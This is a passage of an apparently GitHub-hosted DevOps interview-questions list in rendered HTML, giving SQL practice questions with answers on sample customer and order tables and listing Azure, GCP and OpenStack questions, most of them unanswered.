&lt;h5&gt;&lt;a id="user-content-sql-specific-questions" class="anchor" aria-hidden="true" href="#sql-specific-questions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SQL Specific Questions&lt;/h5&gt;
&lt;p&gt;For these questions, we will be using the Customers and Orders tables shown below:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Customers&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Customer_ID&lt;/th&gt;
&lt;th&gt;Customer_Name&lt;/th&gt;
&lt;th&gt;Items_in_cart&lt;/th&gt;
&lt;th&gt;Cash_spent_to_Date&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;100204&lt;/td&gt;
&lt;td&gt;John Smith&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;20.00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100205&lt;/td&gt;
&lt;td&gt;Jane Smith&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;40.00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100206&lt;/td&gt;
&lt;td&gt;Bobby Frank&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;100.20&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;ORDERS&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Customer_ID&lt;/th&gt;
&lt;th&gt;Order_ID&lt;/th&gt;
&lt;th&gt;Item&lt;/th&gt;
&lt;th&gt;Price&lt;/th&gt;
&lt;th&gt;Date_sold&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;100206&lt;/td&gt;
&lt;td&gt;A123&lt;/td&gt;
&lt;td&gt;Rubber Ducky&lt;/td&gt;
&lt;td&gt;2.20&lt;/td&gt;
&lt;td&gt;2019-09-18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100206&lt;/td&gt;
&lt;td&gt;A123&lt;/td&gt;
&lt;td&gt;Bubble Bath&lt;/td&gt;
&lt;td&gt;8.00&lt;/td&gt;
&lt;td&gt;2019-09-18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100206&lt;/td&gt;
&lt;td&gt;Q987&lt;/td&gt;
&lt;td&gt;80-Pack TP&lt;/td&gt;
&lt;td&gt;90.00&lt;/td&gt;
&lt;td&gt;2019-09-20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100205&lt;/td&gt;
&lt;td&gt;Z001&lt;/td&gt;
&lt;td&gt;Cat Food - Tuna Fish&lt;/td&gt;
&lt;td&gt;10.00&lt;/td&gt;
&lt;td&gt;2019-08-05&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100205&lt;/td&gt;
&lt;td&gt;Z001&lt;/td&gt;
&lt;td&gt;Cat Food - Chicken&lt;/td&gt;
&lt;td&gt;10.00&lt;/td&gt;
&lt;td&gt;2019-08-05&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100205&lt;/td&gt;
&lt;td&gt;Z001&lt;/td&gt;
&lt;td&gt;Cat Food - Beef&lt;/td&gt;
&lt;td&gt;10.00&lt;/td&gt;
&lt;td&gt;2019-08-05&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100205&lt;/td&gt;
&lt;td&gt;Z001&lt;/td&gt;
&lt;td&gt;Cat Food - Kitty quesadilla&lt;/td&gt;
&lt;td&gt;10.00&lt;/td&gt;
&lt;td&gt;2019-08-05&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;100204&lt;/td&gt;
&lt;td&gt;X202&lt;/td&gt;
&lt;td&gt;Coffee&lt;/td&gt;
&lt;td&gt;20.00&lt;/td&gt;
&lt;td&gt;2019-04-29&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;details&gt;
&lt;summary&gt;How would I select all fields from this table?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Select * &lt;br&gt;
From Customers;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How many items are in John's cart?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Select Items_in_cart &lt;br&gt;
From Customers &lt;br&gt;
Where Customer_Name = "John Smith";
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the sum of all the cash spent across all customers?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Select SUM(Cash_spent_to_Date) as SUM_CASH &lt;br&gt;
From Customers;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How many people have items in their cart?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Select count(1) as Number_of_People_w_items &lt;br&gt;
From Customers &lt;br&gt;
where Items_in_cart &amp;gt; 0;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you join the customer table to the order table?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You would join them on the unique key. In this case, the unique key is Customer_ID in
both the Customers table and Orders table
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you show which customer ordered which items?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Select c.Customer_Name, o.Item &lt;br&gt;
From Customers c &lt;br&gt;
Left Join Orders o &lt;br&gt;
On c.Customer_ID = o.Customer_ID;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-sql-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-advanced-1" class="anchor" aria-hidden="true" href="#advanced-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Using a with statement, how would you show who ordered cat food, and the total amount of money spent?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;with cat_food as ( &lt;br&gt;
Select Customer_ID, SUM(Price) as TOTAL_PRICE &lt;br&gt;
From Orders &lt;br&gt;
Where Item like "%Cat Food%" &lt;br&gt;
Group by Customer_ID &lt;br&gt;
) &lt;br&gt;
Select Customer_name, TOTAL_PRICE &lt;br&gt;
From Customers c &lt;br&gt;
Inner JOIN cat_food f &lt;br&gt;
ON c.Customer_ID = f.Customer_ID &lt;br&gt;
where c.Customer_ID in (Select Customer_ID from cat_food);&lt;/p&gt;
&lt;p&gt;Although this was a simple statement, the "with" clause really shines when
a complex query needs to be run on a table before joining to another. With statements are nice,
because you create a pseudo temp when running your query, instead of creating a whole new table.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The Sum of all the purchases of cat food weren't readily available, so we used a with statement to create
the pseudo table to retrieve the sum of the prices spent by each customer, then join the table normally.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-azure" class="anchor" aria-hidden="true" href="#azure"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Azure&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-azure-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-22" class="anchor" aria-hidden="true" href="#baby-beginner-22"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain Azure's architecture&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain availability sets and availability zones&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Azure Policy?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the Azure Resource Manager? Can you describe the format for ARM templates?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Azure managed disks&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-network-2" class="anchor" aria-hidden="true" href="#network-2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Network&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What's an Azure region?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the N-tier architecture?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-storage" class="anchor" aria-hidden="true" href="#storage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Storage&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What storage options Azure supports?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-security" class="anchor" aria-hidden="true" href="#security"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Security&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is the Azure Security Center? What are some of its features?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;It's a monitoring service that provides threat protection across all of the services in Azure.
More specifically, it:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Provides security recommendations based on your usage&lt;/li&gt;
&lt;li&gt;Monitors security settings and continuously all the services&lt;/li&gt;
&lt;li&gt;Analyzes and identifies potential inbound attacks&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Detects and blocks malware using machine learning
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is Azure Active Directory?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Azure AD is a cloud-based identity service. You can use it as a standalone service or integrate it with existing Active Directory service you already running.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Azure Advanced Threat Protection?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What components are part of Azure ATP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-gcp" class="anchor" aria-hidden="true" href="#gcp"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GCP&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-gcp-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-23" class="anchor" aria-hidden="true" href="#baby-beginner-23"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain GCP's architecture&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the main components and services of GCP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What GCP management tools are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Tell me what do you know about GCP networking&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-openstack" class="anchor" aria-hidden="true" href="#openstack"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;OpenStack&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-openstack-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-24" class="anchor" aria-hidden="true" href="#baby-beginner-24"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Tell me about your experience with OpenStack. What do you think are the advantages and disadvantages of OpenStack?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What components/projects of OpenStack are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you tell me what each of the following components/projects is responsible for?:
&lt;ul&gt;
&lt;li&gt;Nova&lt;/li&gt;
&lt;li&gt;Neutron&lt;/li&gt;
&lt;li&gt;Cinder&lt;/li&gt;
&lt;li&gt;Glance&lt;/li&gt;
&lt;li&gt;Keystone&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Describe in detail how you bring up an instance with an IP you can reach from outside the cloud&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You get a call from a customer saying: "I can ping my instance but can't connect (ssh) it". What might be the problem?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What types of networks OpenStack supports?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you debug OpenStack storage issues? (tools, logs, ...)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you debug OpenStack compute issues? (tools, logs, ...)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Are you familiar with TripleO? What benefits it has?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-networking" class="anchor" aria-hidden="true" href="#networking"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Networking&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is a provider network?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What components and services exist for L2 and L3?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the ML2 plug-in? Explain its architecture&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the L2 agent? How it works and what is it responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the L3 agent? How it works and what is it responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what the Metadata agent is responsible for&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What networking entities Neutron supports?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you debug OpenStack networking issues? (tools, logs, ...)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-openstack-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-advanced" class="anchor" aria-hidden="true" href="#baby-advanced"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;h5&gt;&lt;a id="user-content-networking-1" class="anchor" aria-hidden="true" href="#networking-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Networking&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Explain BGP dynamic routing&lt;/summary&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the role of network namespaces in OpenStack?&lt;/summary&gt;
&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-security-1" class="anchor" aria-hidden="true" href="#security-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Security&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-security-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
